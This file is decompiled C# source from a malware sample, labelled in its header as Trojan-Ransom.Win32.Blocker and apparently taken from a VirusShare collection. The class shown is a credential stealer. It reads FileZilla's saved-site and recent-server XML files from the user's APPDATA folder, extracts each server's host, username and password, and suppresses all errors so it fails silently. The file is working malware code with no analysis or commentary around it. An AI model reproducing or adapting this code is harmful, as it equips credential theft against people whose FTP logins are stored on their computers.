// Decompiled with JetBrains decompiler
// Type: rundll32.stealers.fz
// Assembly: rundll32, Version=6.1.7600.16385, Culture=neutral, PublicKeyToken=null
// MVID: F8DEF9AB-CB2D-4DED-9871-4A53218D5E3A
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00070-msil\Trojan-Ransom.Win32.Blocker.jlzp-3198bccbd4230852e51b4a91bbbb499340cca67260e90e0a7fbcec0fe32fa3e8.exe

using System;
using System.Collections.Generic;
using System.IO;

namespace rundll32.stealers
{
  internal class fz
  {
    private static string[] MagicSplit(string source, string expr)
    {
      List<string> stringList = new List<string>();
      stringList.Add(source.Substring(0, source.IndexOf(expr)));
      string str;
      for (str = source.Substring(source.IndexOf(expr) + expr.Length); str.Contains(expr); str = str.Substring(str.IndexOf(expr) + expr.Length))
        stringList.Add(str.Substring(0, str.IndexOf(expr)));
      stringList.Add(str);
      return stringList.ToArray();
    }

    public static fz.fzEntry[] steal()
    {
      List<fz.fzEntry> fzEntryList = new List<fz.fzEntry>();
      try
      {
        try
        {
          foreach (string str in fz.MagicSplit(File.ReadAllText(Environment.GetEnvironmentVariable("APPDATA") + "\\FileZilla\\sitemanager.xml"), "<Server>"))
          {
            if (str.Contains("<Host>"))
              fzEntryList.Add(new fz.fzEntry()
              {
                host = str.Substring(str.IndexOf("<Host>") + 6, str.IndexOf("</Host>") - (str.IndexOf("<Host>") + 6)),
                user = str.Substring(str.IndexOf("<User>") + 6, str.IndexOf("</User>") - (str.IndexOf("<User>") + 6)),
                pass = str.Substring(str.IndexOf("<Pass>") + 6, str.IndexOf("</Pass>") - (str.IndexOf("<Pass>") + 6))
              });
          }
        }
        catch
        {
        }
        try
        {
          foreach (string str in fz.MagicSplit(File.ReadAllText(Environment.GetEnvironmentVariable("APPDATA") + "\\FileZilla\\recentservers.xml"), "<Server>"))
          {
            if (str.Contains("<Host>"))
              fzEntryList.Add(new fz.fzEntry()
              {
                host = str.Substring(str.IndexOf("<Host>") + 6, str.IndexOf("</Host>") - (str.IndexOf("<Host>") + 6)),
                user = str.Substring(str.IndexOf("<User>") + 6, str.IndexOf("</User>") - (str.IndexOf("<User>") + 6)),
                pass = str.Substring(str.IndexOf("<Pass>") + 6, str.IndexOf("</Pass>") - (str.IndexOf("<Pass>") + 6))
              });
          }
        }
        catch
        {
        }
      }
      catch
      {
      }
      return fzEntryList.ToArray();
    }

    public struct fzEntry
    {
      public string host;
      public string user;
      public string pass;
    }
  }
}
